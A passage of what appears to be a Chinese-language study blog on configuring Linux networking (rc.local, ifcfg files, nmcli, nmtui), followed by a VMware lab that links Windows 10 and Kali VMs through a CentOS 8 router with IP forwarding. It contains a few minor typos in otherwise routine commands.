class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@xnha ~]# ping www.qq.com            <span class=\"comment\"># 测试 DNS 解析</span></span><br><span class=\"line\">PING ins-r23tsuuf.ias.tencent-cloud.net (111.30.178.240) 56(84) bytes of data.</span><br><span class=\"line\">64 bytes from 111.30.178.240 (111.30.178.240): icmp_seq=1 ttl=249 <span class=\"keyword\">time</span>=6.22 ms</span><br><span class=\"line\">64 bytes from 111.30.178.240 (111.30.178.240): icmp_seq=2 ttl=249 <span class=\"keyword\">time</span>=6.74 ms</span><br><span class=\"line\">64 bytes from 111.30.178.240 (111.30.178.240): icmp_seq=3 ttl=249 <span class=\"keyword\">time</span>=25.1 ms</span><br><span class=\"line\">64 bytes from 111.30.178.240 (111.30.178.240): icmp_seq=4 ttl=249 <span class=\"keyword\">time</span>=6.15 ms</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"（5）重启不失效的解决方案\"><a href=\"#（5）重启不失效的解决方案\" class=\"headerlink\" title=\"（5）重启不失效的解决方案\"></a>（5）重启不失效的解决方案</h5><p>​\t将命令写进 &#x2F;etc&#x2F;rc.d&#x2F;rc.loca 配置文件 </p>\n<p>​\tetc&#x2F;rc.d 配置文件 是Linux 系统中与 初始化脚本（Init Scripts） 和 服务管理 相关的核心目录。 </p>\n<p>​\tetc&#x2F;rc.d&#x2F;rc.rclocal 是自定义启动命令的文件(开机启动脚本，基本已弃用)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ~]# vim /etc/rc.d/rc.local</span><br><span class=\"line\">ip addr add 192.168.1.100/24 dev ens192</span><br><span class=\"line\">ip route add default via 192.168.1.1</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;namesever 114.114.114.114&quot;</span>&gt;&gt; /etc/resolv.conf</span><br></pre></td></tr></table></figure>\n\n<p>​\t保存退出后，给该文件添加执行权限</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ~]# <span class=\"built_in\">chmod</span> +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>\n\n<p>​\t重启后，配置成功，删除执行权限</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf~]# <span class=\"built_in\">chmod</span> -x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-修改网卡的配置文件-etc-sysconfig-netword-scripts-ifcfg-ensxx\"><a href=\"#2-修改网卡的配置文件-etc-sysconfig-netword-scripts-ifcfg-ensxx\" class=\"headerlink\" title=\"2.修改网卡的配置文件 &#x2F;etc&#x2F;sysconfig&#x2F;netword-scripts&#x2F;ifcfg-ensxx\"></a>2.修改网卡的配置文件 &#x2F;etc&#x2F;sysconfig&#x2F;netword-scripts&#x2F;ifcfg-ensxx</h4><h5 id=\"（1）先备份网卡配置信息，在修改\"><a href=\"#（1）先备份网卡配置信息，在修改\" class=\"headerlink\" title=\"（1）先备份网卡配置信息，在修改\"></a>（1）先备份网卡配置信息，在修改</h5><p>​\t先备份网卡配置文件，在修改</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf network-scripts]# <span class=\"built_in\">ls</span></span><br><span class=\"line\">ifcfg-ens160  ifcfg-ens192</span><br><span class=\"line\">[root@wyf network-scripts]# <span class=\"built_in\">mv</span> ifcfg-ens192 ifcfg-ens192.bak</span><br><span class=\"line\">[root@wyf network-scripts]# <span class=\"built_in\">touch</span> ifcfg-ens192</span><br><span class=\"line\">[root@wyf network-scripts]# <span class=\"built_in\">ls</span></span><br><span class=\"line\">ifcfg-ens160  ifcfg-ens192  ifcfg-ens192.bak</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"（2）编辑配置文件，每个参数都要背下来！！！\"><a href=\"#（2）编辑配置文件，每个参数都要背下来！！！\" class=\"headerlink\" title=\"（2）编辑配置文件，每个参数都要背下来！！！\"></a>（2）编辑配置文件，每个参数都要背下来！！！</h5><p>​\t最简化配置参数</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807154941664.png\" alt=\"image-20250807154941664\"></p>\n<h5 id=\"（3）重启后验证\"><a href=\"#（3）重启后验证\" class=\"headerlink\" title=\"（3）重启后验证\"></a>（3）重启后验证</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ~]# ip addr</span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group </span><br><span class=\"line\">default qlen 1000</span><br><span class=\"line\">\t<span class=\"built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">\tinet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">\t\tvalid_lft forever preferred_lft forever</span><br><span class=\"line\">\tinet6 ::1/128 scope host </span><br><span class=\"line\">\t\tvalid_lft forever preferred_lft forever</span><br><span class=\"line\">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group </span><br><span class=\"line\">default qlen 1000</span><br><span class=\"line\">\t<span class=\"built_in\">link</span>/ether 00:0c:29:5c:a4:ed brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">3: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group </span><br><span class=\"line\">efault qlen 1000</span><br><span class=\"line\">\t<span class=\"built_in\">link</span>/ether 00:0c:29:5c:a4:f7 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">\tinet 192.168.1.100/24 brd 192.168.1.255 scope global noprefixroute ens192</span><br><span class=\"line\">\t\tvalid_lft forever preferred_lft forever</span><br><span class=\"line\">\tinet6 fe80::20c:29ff:fe5c:a4f7/64 scope <span class=\"built_in\">link</span> </span><br><span class=\"line\">\t\tvalid_lft forever preferred_lft forever</span><br><span class=\"line\">[root@wyf ~]# ping www.baidu.com</span><br><span class=\"line\">PING www.a.shifen.com (39.156.70.239) 56(84) bytes of data.</span><br><span class=\"line\">64 bytes from 39.156.70.239 (39.156.70.239): icmp_seq=1 ttl=53 <span class=\"keyword\">time</span>=10.8 ms</span><br><span class=\"line\">64 bytes from 39.156.70.239 (39.156.70.239): icmp_seq=2 ttl=53 <span class=\"keyword\">time</span>=12.1 ms</span><br><span class=\"line\">64 bytes from 39.156.70.239 (39.156.70.239): icmp_seq=3 ttl=53 <span class=\"keyword\">time</span>=10.7 ms</span><br><span class=\"line\">64 bytes from 39.156.70.239 (39.156.70.239): icmp_seq=4 ttl=53 <span class=\"keyword\">time</span>=10.8 ms</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-nmcli-命令配置IP（基于NetworkManager的管理工具）-network-etc-sysconfig-network-scripts-ifcfg-ensxx\"><a href=\"#3-nmcli-命令配置IP（基于NetworkManager的管理工具）-network-etc-sysconfig-network-scripts-ifcfg-ensxx\" class=\"headerlink\" title=\"3.nmcli 命令配置IP（基于NetworkManager的管理工具） network &#x2F;etc&#x2F;sysconfig&#x2F;network scripts&#x2F;ifcfg-ensxx\"></a>3.nmcli 命令配置IP（基于NetworkManager的管理工具） network &#x2F;etc&#x2F;sysconfig&#x2F;network scripts&#x2F;ifcfg-ensxx</h4><h5 id=\"（1）查看所有网络连接\"><a href=\"#（1）查看所有网络连接\" class=\"headerlink\" title=\"（1）查看所有网络连接\"></a>（1）查看所有网络连接</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ~]# nmcli connection show</span><br></pre></td></tr></table></figure>\n\n<p>​\t输出示例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NAME           UUID                                  TYPE      DEVICE </span><br><span class=\"line\">System ens192  03da7500-2101-c722-2438-d0d006c28c73  ethernet  ens192 </span><br><span class=\"line\">ens160         aaca87e6-f62a-4693-a09b-1ac25d77b8f2  ethernet  --   </span><br></pre></td></tr></table></figure>\n\n<h5 id=\"（2）查看特定连接详情\"><a href=\"#（2）查看特定连接详情\" class=\"headerlink\" title=\"（2）查看特定连接详情\"></a>（2）查看特定连接详情</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmcli connection show <span class=\"string\">&quot;ens192&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"（3）启用-禁用接口\"><a href=\"#（3）启用-禁用接口\" class=\"headerlink\" title=\"（3）启用&#x2F;禁用接口\"></a>（3）启用&#x2F;禁用接口</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 启用 eth0</span></span><br><span class=\"line\">nmcli connection up eth0</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 禁用 wlan0</span></span><br><span class=\"line\">nmcli connection down wlan0</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"（4）配置静态-IP\"><a href=\"#（4）配置静态-IP\" class=\"headerlink\" title=\"（4）配置静态 IP\"></a>（4）配置静态 IP</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 设置 eth0 为静态 IP 192.168.1.100/24，网关 192.168.1.1</span></span><br><span class=\"line\">nmcli connection modify eth0 \\</span><br><span class=\"line\">\t<span class=\"built_in\">type</span> ethernet \\</span><br><span class=\"line\">\tip4 192.168.1.100/24 \\</span><br><span class=\"line\">\tgateway4 192.168.1.1 \\</span><br><span class=\"line\">\tdns <span class=\"string\">&quot;8.8.8.8;8.8.4.4&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"（5）配置-DHCP\"><a href=\"#（5）配置-DHCP\" class=\"headerlink\" title=\"（5）配置 DHCP\"></a>（5）配置 DHCP</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 设置 eth0 为 DHCP 自动获取 IP</span></span><br><span class=\"line\">nmcli connection modify eth0 \\</span><br><span class=\"line\">\t<span class=\"built_in\">type</span> ethernet \\</span><br><span class=\"line\">\tip4 auto dhcp</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"4-nmtui-图形化配置\"><a href=\"#4-nmtui-图形化配置\" class=\"headerlink\" title=\"4.nmtui-图形化配置\"></a>4.nmtui-图形化配置</h4><p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807155424746.png\"></p>\n<h2 id=\"四、实验\"><a href=\"#四、实验\" class=\"headerlink\" title=\"四、实验\"></a>四、实验</h2><h3 id=\"1、实验一\"><a href=\"#1、实验一\" class=\"headerlink\" title=\"1、实验一\"></a>1、实验一</h3><p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807103451874.png\" alt=\"image-20250807103451874\"></p>\n<p>实验步骤</p>\n<h4 id=\"1-给-VMware-添加两个虚拟网卡\"><a href=\"#1-给-VMware-添加两个虚拟网卡\" class=\"headerlink\" title=\"1.给 VMware 添加两个虚拟网卡\"></a>1.给 VMware 添加两个虚拟网卡</h4><p>点击左上角编辑，找到虚拟网络编辑器，点击</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807104029251.png\" alt=\"image-20250807104029251\"></p>\n<p>使用管理员权限进行修改，添加VMnet1和VMnet2两张虚拟网卡，将使用本地DHCP服务将IP地址分配给虚拟机取消掉</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807104205455.png\" alt=\"image-20250807104205455\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807104228254.png\" alt=\"image-20250807104228254\"></p>\n<p>完成后点击确定。</p>\n<h4 id=\"2-配置-Windows10\"><a href=\"#2-配置-Windows10\" class=\"headerlink\" title=\"2.配置 Windows10\"></a>2.配置 Windows10</h4><p>先修改Windows10虚拟机网络适配器配置，将其修改成VMnet2</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807103828826.png\" alt=\"image-20250807103828826\"></p>\n<p>修改完成后点击确定，打开Windows10虚拟机，进去后找到右下角网络图标，右键，点击打开“网络和Internet”设置</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807104617685.png\" alt=\"image-20250807104617685\"></p>\n<p>点击更改适配器选项</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807104659696.png\" alt=\"image-20250807104659696\"></p>\n<p>右键点击Ethernet0，点击属性</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807104815059.png\" alt=\"image-20250807104815059\"></p>\n<p>找到Internet协议版本4（TCP&#x2F;IPv4），点击属性</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807105038673.png\" alt=\"image-20250807105038673\"></p>\n<p>修改IP地址，子网掩码，默认网关，点击确定</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807105131094.png\" alt=\"image-20250807105131094\"></p>\n<p>现在win+R打开终端，输入ipconfig，可以看到IP地址信息</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807105312921.png\" alt=\"image-20250807105312921\"></p>\n<h4 id=\"3-配置-Kali\"><a href=\"#3-配置-Kali\" class=\"headerlink\" title=\"3.配置 Kali\"></a>3.配置 Kali</h4><p>先修改Kali虚拟机网络适配器配置，将其修改成VMnet3</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807105442195.png\" alt=\"image-20250807105442195\"></p>\n<p>修改完成后点击确定，打开Kali虚拟机后，打开终端，进入&#x2F;etc&#x2F;network目录下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[/etc/network]</span><br><span class=\"line\">└─# <span class=\"built_in\">ls</span> -l</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807110520881.png\" alt=\"image-20250807110520881\"></p>\n<p>先备份interfaces文件为interfaces.back</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[/etc/network]</span><br><span class=\"line\">└─# <span class=\"built_in\">mv</span> interfaces interfaces.back</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807110612467.png\" alt=\"image-20250807110612467\"></p>\n<p>新建一个interfaces文件，对其配置进行修改</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[/etc/network]</span><br><span class=\"line\">└─# vim interfaces</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">auto eth0</span><br><span class=\"line\">iface eth0 inet static</span><br><span class=\"line\">    address 172.16.2.1</span><br><span class=\"line\">    netmask 255.255.255.0</span><br><span class=\"line\">    gateway 172.16.2.254</span><br></pre></td></tr></table></figure>\n\n<p>重启Kali的networking.service</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[/etc/network]</span><br><span class=\"line\">└─# systemctl restart networking.service</span><br></pre></td></tr></table></figure>\n\n<p>在终端输入ip a 可以看到IP发生改变</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807110952284.png\" alt=\"image-20250807110952284\"></p>\n<h4 id=\"4-配置-CentOS-8\"><a href=\"#4-配置-CentOS-8\" class=\"headerlink\" title=\"4.配置 CentOS 8\"></a>4.配置 CentOS 8</h4><p>先修改CentOS 8 虚拟机网络适配器配置，将第一个修改成VMnet2，第二个修改成VMnet3</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807111112327.png\" alt=\"image-20250807111112327\"></p>\n<p>修改后点击确定，打开CentOS 8 虚拟机，打开终端，进入&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts目录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf network-scripts]# <span class=\"built_in\">ls</span> -l</span><br><span class=\"line\">总用量 8</span><br><span class=\"line\">-rw-r--r--. 1 root root 312 7月  28 19:38 ifcfg-ens160</span><br><span class=\"line\">-rw-r--r--. 1 root root 281 7月  28 19:38 ifcfg-ens192</span><br></pre></td></tr></table></figure>\n\n<p>这是我们原先网卡的配置文件，先进行备份</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf network-scripts]# <span class=\"built_in\">mv</span> ifcfg-ens160 ifcfg-ens160.back</span><br><span class=\"line\">[root@wyf network-scripts]# <span class=\"built_in\">mv</span> ifcfg-ens192 ifcfg-ens192.back</span><br></pre></td></tr></table></figure>\n\n<p>新建 ifcfg-ens160 和 ifcfg-ens192 文件，用来存放ip配置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf network-scripts]# vim ifcfg-ens160</span><br><span class=\"line\">TYPE=<span class=\"string\">&quot;Ethernet&quot;</span></span><br><span class=\"line\">BOOTPROTO=<span class=\"string\">&quot;static&quot;</span></span><br><span class=\"line\">DEFROUTE=<span class=\"string\">&quot;yes&quot;</span></span><br><span class=\"line\">NAME=<span class=\"string\">&quot;ens160&quot;</span></span><br><span class=\"line\">DEVICE=<span class=\"string\">&quot;ens160&quot;</span></span><br><span class=\"line\">IPADDR=192.168.2.254</span><br><span class=\"line\">ONBOOT=<span class=\"string\">&quot;yes&quot;</span></span><br><span class=\"line\">[root@wyf network-scripts]# vim ifcfg-ens192</span><br><span class=\"line\">TYPE=<span class=\"string\">&quot;Ethernet&quot;</span></span><br><span class=\"line\">BOOTPROTO=<span class=\"string\">&quot;static&quot;</span></span><br><span class=\"line\">DEFROUTE=<span class=\"string\">&quot;yes&quot;</span></span><br><span class=\"line\">NAME=<span class=\"string\">&quot;ens192&quot;</span></span><br><span class=\"line\">DEVICE=<span class=\"string\">&quot;ens192&quot;</span></span><br><span class=\"line\">IPADDR=172.16.2.254</span><br><span class=\"line\">ONBOOT=<span class=\"string\">&quot;yes&quot;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#原文件</span></span><br><span class=\"line\">[root@wyf network-scripts]# <span class=\"built_in\">cat</span> ifcfg-ens160</span><br><span class=\"line\">TYPE=<span class=\"string\">&quot;Ethernet&quot;</span>                                <span class=\"comment\">#指定网络接口类型为以太网   </span></span><br><span class=\"line\">PROXY_METHOD=<span class=\"string\">&quot;none&quot;</span>                            <span class=\"comment\">#不使用代理服务器配置</span></span><br><span class=\"line\">BROWSER_ONLY=<span class=\"string\">&quot;no&quot;</span>                              <span class=\"comment\">#不是浏览器专用连接</span></span><br><span class=\"line\">BOOTPROTO=<span class=\"string\">&quot;dhcp&quot;</span>                               <span class=\"comment\">#指定自动获取IP地址</span></span><br><span class=\"line\">DEFROUTE=<span class=\"string\">&quot;yes&quot;</span>                                 <span class=\"comment\">#将此接口设为默认路由出口</span></span><br><span class=\"line\">IPV4_FAILURE_FATAL=<span class=\"string\">&quot;no&quot;</span>                        <span class=\"comment\">#IPv4连接失败不影响系统启动</span></span><br><span class=\"line\">IPV6INIT=<span class=\"string\">&quot;yes&quot;</span>                                 <span class=\"comment\">#启用IPv6支持</span></span><br><span class=\"line\">IPV6_AUTOCONF=<span class=\"string\">&quot;yes&quot;</span>                            <span class=\"comment\">#允许IPv6自动配置地址</span></span><br><span class=\"line\">IPV6_DEFROUTE=<span class=\"string\">&quot;yes&quot;</span>                            <span class=\"comment\">#将此接口设为IPv6默认路由</span></span><br><span class=\"line\">IPV6_FAILURE_FATAL=<span class=\"string\">&quot;no&quot;</span>                        <span class=\"comment\">#IPv6连接失败不影响系统启动</span></span><br><span class=\"line\">IPV6_ADDR_GEN_MODE=<span class=\"string\">&quot;stable-privacy&quot;</span>            <span class=\"comment\">#IPv6地址使用稳定隐私模式生成</span></span><br><span class=\"line\">NAME=<span class=\"string\">&quot;ens160&quot;</span>                                  <span class=\"comment\">#指定连接名称</span></span><br><span class=\"line\">UUID=<span class=\"string\">&quot;343088b5-d3dd-48e1-ad69-198d13db9d71&quot;</span>    <span class=\"comment\">#此网络配置的唯一标识符</span></span><br><span class=\"line\">DEVICE=<span class=\"string\">&quot;ens160&quot;</span>                                <span class=\"comment\">#指定此配置文件管理的物理设备名称</span></span><br><span class=\"line\">ONBOOT=<span class=\"string\">&quot;yes&quot;</span>                                   <span class=\"comment\">#开机时自动激活此网络接口</span></span><br></pre></td></tr></table></figure>\n\n<p>开启路由转发功能，修改文件&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward文件，默认是0，改为1（使用vim无法修改，这里使用echo）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ipv4]# <span class=\"built_in\">echo</span> 1 &gt; ip_forward</span><br><span class=\"line\">[root@wyf ipv4]# <span class=\"built_in\">cat</span> ip_forward</span><br><span class=\"line\">1</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>特殊文件类型</strong><br><code>/proc/sys/</code> 下的文件不是普通磁盘文件，而是<strong>内核参数映射接口</strong>​</li>\n<li><strong>权限限制</strong><br>即使 root 用户也不能直接用编辑器修改，必须通过系统工具写入</li>\n<li><strong>写入要求</strong><br>只能接受特定数值（0或1），不接受文本编辑</li>\n<li><strong>临时性修改</strong><br>通过 <code>/proc</code> 路径的修改在重启后会失效</li>\n</ol>\n<p>应用配置并重启网络</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ipv4]# nmcli connection reload</span><br><span class=\"line\">[root@wyf ipv4]# systemctl restart NetworkManager</span><br></pre></td></tr></table></figure>\n\n<p>这是可以查看IP回显</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf ipv4]# ip a</span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    <span class=\"built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 ::1/128 scope host </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class=\"line\">    <span class=\"built_in\">link</span>/ether 00:0c:29:d0:f2:6b brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 192.168.2.254/24 brd 192.168.2.255 scope global noprefixroute ens160</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 fe80::20c:29ff:fed0:f26b/64 scope <span class=\"built_in\">link</span> </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">3: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class=\"line\">    <span class=\"built_in\">link</span>/ether 00:0c:29:d0:f2:75 brd ff:ff:ff:ff:ff:ff</span><br><span class=\"line\">    inet 172.16.2.254/16 brd 172.16.255.255 scope global noprefixroute ens192</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 fe80::20c:29ff:fed0:f275/64 scope <span class=\"built_in\">link</span> </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>\n\n<p>如果这里有网卡未显示ip，可以去右上角网络连接用图形化界面进行修改（最便捷的方法）</p>\n<h4 id=\"5-验证\"><a href=\"#5-验证\" class=\"headerlink\" title=\"5.验证\"></a>5.验证</h4><p>使用 Windows10 来 ping Kali</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807143437287.png\" alt=\"image-20250807143437287\"></p>\n<p>使用 Kali 来 ping Windows10</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250807143554283.png\" alt=\"image-20250807143554283\"></p>\n<p>证明192.168.2.1和172.16.2.1能够互通</p>\n<h3 id=\"2、实验二\"><a href=\"#2、实验二\" 